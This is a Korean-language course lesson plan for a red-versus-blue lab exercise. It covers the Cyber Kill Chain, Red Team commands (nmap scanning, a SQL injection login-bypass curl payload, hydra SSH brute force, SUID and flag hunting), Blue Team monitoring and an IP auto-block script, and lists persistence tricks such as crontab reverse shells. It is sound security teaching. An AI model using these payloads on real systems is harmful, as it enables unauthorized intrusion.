# Week 12: 1v1 공방전 실전 (2) — 침투 vs 방어

## 학습 목표
- Red Team으로서 취약점을 활용한 침투를 수행할 수 있다
- Blue Team으로서 침투 시도를 탐지하고 실시간 차단할 수 있다
- 공격 체인(Kill Chain)의 각 단계에서 방어 기회를 파악한다
- 공방전 중 발생한 이벤트를 타임라인으로 재구성할 수 있다

## 선수 지식
- 웹 공격 기초 (Week 03)
- 패스워드 공격 (Week 04)
- 권한 상승 (Week 05)
- Week 11 공방전 경험

## 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:20 | 침투 단계 이론 및 규칙 설명 | 강의 |
| 0:20-0:35 | Blue Team 준비 시간 (15분) | 실습 |
| 0:35-0:45 | 휴식 + 최종 확인 | - |
| 0:45-1:45 | 1라운드: 침투 vs 방어 (60분) | 실전 |
| 1:45-1:55 | 휴식 | - |
| 1:55-2:55 | 2라운드: 역할 교체 (60분) | 실전 |
| 2:55-3:40 | Kill Chain 분석 + 디브리핑 | 토론 |

---

# Part 1: 침투 단계 이론 (20분)

## 1.1 Cyber Kill Chain

Lockheed Martin의 Cyber Kill Chain은 공격의 7단계를 정의한다.

```
1. Reconnaissance (정찰)        ← Week 11에서 수행
2. Weaponization (무기화)       ← 익스플로잇 준비
3. Delivery (전달)              ← 공격 페이로드 전송
4. Exploitation (침투)          ← 취약점 악용     ★ 이번 주
5. Installation (설치)          ← 백도어/지속성
6. Command & Control (C2)      ← 원격 제어
7. Actions on Objectives (목표) ← 데이터 탈취
```

### 각 단계별 방어 기회

| 단계 | 공격 활동 | 방어 기회 |
|------|----------|----------|
| Delivery | 페이로드 전송 | WAF, 이메일 필터 |
| Exploitation | 취약점 악용 | 패치, IPS |
| Installation | 백도어 설치 | FIM, 앤티바이러스 |
| C2 | 외부 통신 | 아웃바운드 필터링 |

## 1.2 이번 주 점수 체계

| 항목 | Red Team 점수 | Blue Team 점수 |
|------|-------------|---------------|
| 초기 접근 성공 | +20 | - |
| 권한 상승 | +15 | - |
| 플래그 획득 | +30 | - |
| 침투 탐지 | - | +15 |
| 침투 차단 | - | +20 |
| 서비스 가용성 유지 | - | +20 |
| 포렌식 보고서 | - | +15 |

---

# Part 2: 실습 가이드

## 실습 2.1: Red Team — 침투 수행

> **목적**: Week 11에서 수집한 정보를 기반으로 실제 침투를 수행한다
> **배우는 것**: 공격 체인 실행, 다단계 침투, 흔적 최소화

```bash
# 침투 계획 (60분 타임라인)
# 0-10분: 빠른 재정찰 + 공격 벡터 선택
# 10-30분: 초기 접근 시도
# 30-45분: 권한 상승
# 45-55분: 플래그 획득
# 55-60분: 흔적 정리 (선택)

# 1단계: 빠른 재정찰
nmap -sV -p 22,80,3000 -T3 10.20.30.Y

# 2단계: 웹 공격 시도
# SQLi
curl -X POST http://10.20.30.Y:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' OR 1=1--","password":"test"}'

# 3단계: SSH 패스워드 공격
hydra -l admin -P /tmp/passwords.txt ssh://10.20.30.Y -t 4 -f

# 4단계: 침투 후 권한 상승
# SSH 접속 성공 시
sudo -l
find / -perm -4000 -type f 2>/dev/null

# 5단계: 플래그 탐색
find / -name "flag*" -o -name "*.flag" 2>/dev/null
cat /root/flag.txt 2>/dev/null
```

> **결과 해석**: 초기 접근에 성공하면 내부 정찰 → 권한 상승 → 목표 달성 순서로 진행한다. 여러 공격 벡터를 병행하여 시간을 절약한다.
> **실전 활용**: 한 가지 공격이 실패하면 즉시 다른 벡터로 전환하는 유연성이 중요하다.

## 실습 2.2: Blue Team — 침투 탐지 및 방어

> **목적**: Red Team의 침투 시도를 실시간 탐지하고 차단한다
> **배우는 것**: 다층 방어, 실시간 대응, 포렌식 기록

```bash
# 준비 시간 (15분) 강화 체크리스트
# 1. 플래그 파일 권한 강화
sudo chmod 600 /root/flag.txt
sudo chattr +i /root/flag.txt

# 2. 웹 서비스 보호
# WAF 활성화 확인
# 에러 메시지에서 버전 정보 제거

# 3. 다층 모니터링 체계
# 터미널 1: IDS
tail -f /var/log/suricata/fast.log | grep --color "ATTACK\|SQL\|XSS\|SCAN"

# 터미널 2: 웹 로그
tail -f /var/log/apache2/access.log 2>/dev/null

# 터미널 3: 인증 로그
tail -f /var/log/auth.log | grep --color "Failed\|Accepted\|sudo"

# 4. 실시간 차단 스크립트
# 5회 이상 실패한 IP 자동 차단
while true; do
  ATTACK_IP=$(grep "Failed password" /var/log/auth.log | \
    awk '{print $(NF-3)}' | sort | uniq -c | \
    awk '$1 >= 5 {print $2}' | tail -1)
  if [ -n "$ATTACK_IP" ]; then
    sudo nft add element inet filter blocked_ips { "$ATTACK_IP" } 2>/dev/null
    echo "$(date): BLOCKED $ATTACK_IP" >> /tmp/defense_log.txt
  fi
  sleep 10
done &
```

> **결과 해석**: 다층 모니터링으로 웹, 네트워크, 인증 레이어에서 동시에 감시한다. 자동 차단 스크립트로 대응 시간을 단축한다.

## 실습 2.3: Kill Chain 분석

> **목적**: 공방전 종료 후 전체 공격/방어 흐름을 재구성한다
> **배우는 것**: 타임라인 분석, Kill Chain 매핑, 교훈 도출

```bash
# Red Team 활동 타임라인 추출
echo "=== Red Team 타임라인 ===" > /tmp/killchain.txt
echo "--- 정찰 ---" >> /tmp/killchain.txt
grep "SCAN\|RECON" /var/log/suricata/fast.log >> /tmp/killchain.txt

echo "--- 침투 시도 ---" >> /tmp/killchain.txt
grep "SQL\|XSS\|ATTACK" /var/log/suricata/fast.log >> /tmp/killchain.txt

echo "--- 인증 시도 ---" >> /tmp/killchain.txt
grep "Failed\|Accepted" /var/log/auth.log >> /tmp/killchain.txt

echo "--- 권한 상승 ---" >> /tmp/killchain.txt
grep "sudo" /var/log/auth.log >> /tmp/killchain.txt

# Blue Team 대응 타임라인
cat /tmp/defense_log.txt
```

---

# Part 3: 심화 학습

## 3.1 지속성 확보 기법 (Red Team)

침투 후 접근을 유지하기 위한 기법:

- SSH 공개키 추가
- crontab에 리버스 셸 등록
- 백도어 사용자 계정 생성
- 합법적 서비스에 백도어 삽입

## 3.2 지속성 탐지 (Blue Team)

- 주기적 authorized_keys 모니터링
- crontab 변경 감시
- /etc/passwd 파일 무결성 검증
- 프로세스 이상 탐지

---

## 검증 체크리스트
- [ ] Red Team: 최소 1가지 공격으로 초기 접근에 성공했는가
- [ ] Blue Team: 침투 시도를 3건 이상 탐지하고 기록했는가
- [ ] Kill Chain 분석을 통해 공격/방어 흐름을 재구성했는가
- [ ] 양쪽 역할의 교훈을 3가지 이상 도출했는가

## 자가 점검 퀴즈
1. Cyber Kill Chain의 7단계를 순서대로 나열하고 각 단계의 방어 기회를 설명하라.
2. 공방전에서 Red Team이 한 가지 공격에 실패했을 때 취해야 할 전략은?
3. Blue Team의 다층 방어(Defense in Depth)가 중요한 이유를 설명하라.
4. 침투 후 지속성(Persistence)을 탐지하기 위해 점검할 항목 4가지는?
5. 공방전 결과 분석에서 타임라인 재구성이 중요한 이유를 설명하라.
